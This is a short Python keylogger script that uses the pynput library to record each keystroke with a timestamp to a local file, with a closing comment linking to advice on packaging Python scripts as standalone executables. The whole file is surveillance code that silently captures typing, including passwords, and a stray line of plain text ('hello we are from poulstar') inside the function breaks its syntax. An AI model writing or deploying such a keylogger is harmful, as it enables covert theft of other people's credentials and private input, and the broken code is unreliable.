from pynput import keyboard 
from datetime import datetime


def on_press(key):    
    file = open('key_log.txt', 'a')

    if str(key) == "Key.space":
        file.write(" ")       
    else:
        file.write(str(key).replace("'", ''))  
    file.write(datetime.now().strftime('%Y-%m-%d, %H:%M:%S'))  
    file.write('\n') 
    file.close() 
    hello we are from poulstar


f = open('key_log.txt', 'w')
f.close()
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
# https://stackoverflow.com/questions/5458048/how-can-i-make-a-python-script-standalone-executable-to-run-without-any-dependen